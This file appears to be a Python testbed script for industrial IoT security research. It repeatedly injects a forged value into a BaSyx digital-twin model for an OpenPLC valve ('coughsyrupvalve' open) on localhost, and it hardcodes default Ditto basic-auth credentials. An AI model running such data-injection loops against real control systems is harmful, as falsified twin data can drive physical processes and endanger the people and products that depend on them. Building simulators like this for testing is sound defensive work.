#!/usr/bin/env python3
"""
Attack Simulator for BaSyx
This script simulates setting values in BaSyx for specific Ditto things, features, and properties
without actually modifying anything in Ditto. It's useful for testing and simulation purposes.
Runs in a continuous loop, periodically executing configured attacks.
"""

import requests
import json
import base64
import time
from datetime import datetime
from typing import Dict, Any, Optional, List
import logging

# Configuration
BASYX_URL = "http://127.0.0.1:8091"
DITTO_URL = "http://127.0.0.1:8080/api/2"
DITTO_HEADERS = {"Authorization": "Basic ZGl0dG86ZGl0dG8="}
ATTACK_INTERVAL = 10  # seconds between attack cycles (interval secs are not defined)

# Endpoints
BASYX_SHELLS_ENDPOINT = f"{BASYX_URL}/shells"
BASYX_SUBMODELS_ENDPOINT = f"{BASYX_URL}/submodels"

# Attack configuration embedded in the file
ATTACK_CONFIG = {
    "attack_targets": [
        {
            "thing_id": "openplc:103b3864-923d-49d0-8f1c-8c6810a025c3",
            "feature_id": "coughsyrupvalve",
            "property_id": "open",
            "attack_value": "ABCD",
            "description": "Inject open state"
        },
        # {
        #     "thing_id": "com.example:device1",
        #     "feature_id": "pressure",
        #     "property_id": "value",
        #     "attack_value": "0",
        #     "description": "Inject zero pressure value"
        # }
    ],
    "attack_settings": {
        "interval_seconds": 2
    }
}

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('attack.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


def get_attack_config() -> Dict[str, Any]:
    """Get the embedded attack configuration."""
    return ATTACK_CONFIG


def encode_id(raw_id: str) -> str:
    """UTF-8 encode then URL-safe Base64 encode the ID."""
    utf8_bytes = raw_id.encode('utf-8')
    b64_bytes = base64.urlsafe_b64encode(utf8_bytes)
    return b64_bytes.decode('ascii')


def get_basyx_shell(thing_id: str) -> Optional[requests.Response]:
    """Check if BaSyx shell exists for the given thing ID."""
    try:
        encoded = encode_id(thing_id)
        url = f"{BASYX_SHELLS_ENDPOINT}/{encoded}"
        response = requests.get(url)
        return response if response.status_code != 404 else None
    except requests.RequestException as e:
        logger.error(f"Error checking BaSyx shell for {thing_id}: {e}")
        return None


def create_basyx_shell(thing_id: str) -> bool:
    """Create BaSyx shell for the given thing ID."""
    try:
        payload = {
            "id": thing_id,
            "idShort": thing_id.split(":")[0].upper(),
            "assetInformation": {
                "assetKind": "INSTANCE",
                "globalAssetId": thing_id
            }
        }
        response = requests.post(BASYX_SHELLS_ENDPOINT, json=payload)
        response.raise_for_status()
        logger.info(f"Created BaSyx shell for thing: {thing_id}")
        return True
    except requests.RequestException as e:
        logger.error(f"Error creating BaSyx shell for {thing_id}: {e}")
        return False


def get_basyx_submodel(submodel_id: str) -> Optional[requests.Response]:
    """Check if BaSyx submodel exists for the given submodel ID."""
    try:
        encoded = encode_id(submodel_id)
        url = f"{BASYX_SUBMODELS_ENDPOINT}/{encoded}"
        response = requests.get(url)
        return response if response.status_code != 404 else None
    except requests.RequestException as e:
        logger.error(f"Error checking BaSyx submodel for {submodel_id}: {e}")
        return None


def create_basyx_submodel(thing_id: str, submodel_id: str) -> bool:
    """Create BaSyx submodel and attach it to the shell."""
    try:
        submodel_name = submodel_id.split(":")[-1] if ":" in submodel_id else submodel_id

        # Create submodel
        payload = {
            "id": submodel_id,
            "idShort": submodel_name,
            "assetInformation": {
                "assetKind": "INSTANCE",
                "globalAssetId": submodel_id
            }
        }
        response = requests.post(BASYX_SUBMODELS_ENDPOINT, json=payload)
        response.raise_for_status()
        logger.info(f"Created BaSyx submodel: {submodel_id}")

        # Attach submodel to shell
        encoded_shell = encode_id(thing_id)
        reference_payload = {
            "type": "EXTERNAL_REFERENCE",
            "keys": [{"type": "Submodel", "value": submodel_id}]
        }
        shell_link_url = f"{BASYX_SHELLS_ENDPOINT}/{encoded_shell}/submodel-refs"
        link_response = requests.post(shell_link_url, json=reference_payload)
        link_response.raise_for_status()
        logger.info(f"Attached submodel {submodel_id} to shell {thing_id}")
        return True
    except requests.RequestException as e:
        logger.error(f"Error creating BaSyx submodel {submodel_id}: {e}")
        return False


def update_basyx_element(submodel_id: str, element_id: str, value: Any) -> bool:
    """Update or create a BaSyx submodel element with the given value."""
    try:
        encoded_submodel = encode_id(submodel_id)
        
        # Check if element exists
        check_url = f"{BASYX_URL}/submodels/{encoded_submodel}/submodel-elements/{element_id}"
        response = requests.get(check_url)
        
        if response.status_code == 404:
            # Create element
            create_url = f"{BASYX_URL}/submodels/{encoded_submodel}/submodel-elements"
            payload = {
                "idShort": element_id,
                "modelType": "Property",
                "valueType": "string",
                "value": str(value)
            }
            requests.post(create_url, json=payload).raise_for_status()
            logger.info(f"Created element {element_id} in {submodel_id} with value: {value}")
        else:
            # Update existing element
            update_url = f"{BASYX_URL}/submodels/{encoded_submodel}/submodel-elements/{element_id}/$value"
            requests.patch(update_url, json=f'"{value}"').raise_for_status()
            logger.info(f"Updated element {element_id} in {submodel_id} with value: {value}")
        
        return True
    except requests.RequestException as e:
        logger.error(f"Error updating BaSyx element {submodel_id}/{element_id}: {e}")
        return False


def verify_ditto_thing_exists(thing_id: str) -> bool:
    """Verify that the thing exists in Ditto (optional check)."""
    try:
        url = f"{DITTO_URL}/things/{thing_id}"
        response = requests.get(url, headers=DITTO_HEADERS)
        return response.status_code == 200
    except requests.RequestException:
        return False


def simulate_attack(thing_id: str, feature_id: str, property_id: str, value: Any, 
                   verify_ditto: bool = False, description: str = "") -> bool:
    """
    Simulate an attack by setting a specific value in BaSyx for a Ditto thing/feature/property.
    
    Args:
        thing_id: The Ditto thing ID
        feature_id: The feature ID within the thing
        property_id: The property ID within the feature
        value: The value to set in BaSyx
        verify_ditto: Whether to verify the thing exists in Ditto (optional)
        description: Description of the attack
    
    Returns:
        True if the attack simulation was successful, False otherwise
    """
    logger.info(f"🎯 Starting attack: {description}")
    logger.info(f"   Target: {thing_id}:{feature_id}:{property_id} = {value}")
    
    # Optional: Verify thing exists in Ditto
    if verify_ditto:
        logger.info("🔍 Verifying thing exists in Ditto...")
        if not verify_ditto_thing_exists(thing_id):
            logger.warning(f"Thing {thing_id} not found in Ditto, continuing anyway")
        else:
            logger.info(f"Thing {thing_id} found in Ditto")
    
    # Ensure BaSyx shell exists
    if not get_basyx_shell(thing_id):
        if not create_basyx_shell(thing_id):
            return False
    
    # Create submodel ID
    submodel_id = f"{thing_id}:{feature_id}"
    
    # Ensure BaSyx submodel exists
    if not get_basyx_submodel(submodel_id):
        if not create_basyx_submodel(thing_id, submodel_id):
            return False
    
    # Update the element value in BaSyx
    if update_basyx_element(submodel_id, property_id, value):
        logger.info(f"🎉 Attack successful: {thing_id}:{feature_id}:{property_id} = {value}")
        return True
    else:
        logger.error(f"❌ Attack failed: {thing_id}:{feature_id}:{property_id}")
        return False


def execute_attack_cycle() -> Dict[str, int]:
    """Execute a complete attack cycle based on embedded configuration."""
    logger.info("🔄 Starting attack cycle...")
    
    config = get_attack_config()
    attack_targets = config.get("attack_targets", [])
    
    results = {"successful": 0, "failed": 0, "total": len(attack_targets)}
    
    for target in attack_targets:
        try:
            thing_id = target.get("thing_id")
            feature_id = target.get("feature_id")
            property_id = target.get("property_id")
            attack_value = target.get("attack_value")
            description = target.get("description", f"Attack on {thing_id}")
            
            if not all([thing_id, feature_id, property_id, attack_value is not None]):
                logger.error(f"Invalid attack target configuration: {target}")
                results["failed"] += 1
                continue
            
            success = simulate_attack(
                thing_id=thing_id,
                feature_id=feature_id,
                property_id=property_id,
                value=attack_value,
                verify_ditto=False,
                description=description
            )
            
            if success:
                results["successful"] += 1
            else:
                results["failed"] += 1
                
        except Exception as e:
            logger.error(f"Error executing attack target {target}: {e}")
            results["failed"] += 1
    
    logger.info(f"Attack cycle completed: {results['successful']}/{results['total']} successful")
    return results


def run_continuous_attacks():
    """Main loop for continuous attack execution."""
    try:
        while True:
            attack_settings = ATTACK_CONFIG.get("attack_settings", {})
            interval = attack_settings.get("interval_seconds", ATTACK_INTERVAL)
            
            # Execute attack cycle
            results = execute_attack_cycle()
            
            logger.info(f"Next attack cycle in {interval} seconds...")
            time.sleep(interval)
            
    except KeyboardInterrupt:
        logger.info("🛑 Attack Simulator stopped by user")
    except Exception as e:
        logger.critical(f"💥 Critical error in attack simulator: {e}")
        raise


def main():
    """Main function to run continuous attacks."""
    logger.info("🚀 Attack Simulator started")
    logger.info(f"Configuration:")
    logger.info(f"  BaSyx URL: {BASYX_URL}")
    logger.info(f"  Ditto URL: {DITTO_URL}")
    logger.info(f"  Attack targets: {len(ATTACK_CONFIG['attack_targets'])}")
    logger.info(f"  Attack interval: {ATTACK_CONFIG['attack_settings']['interval_seconds']} seconds")
    logger.info(f"{'='*60}")
    
    # Run continuous attacks
    run_continuous_attacks()


if __name__ == "__main__":
    main()
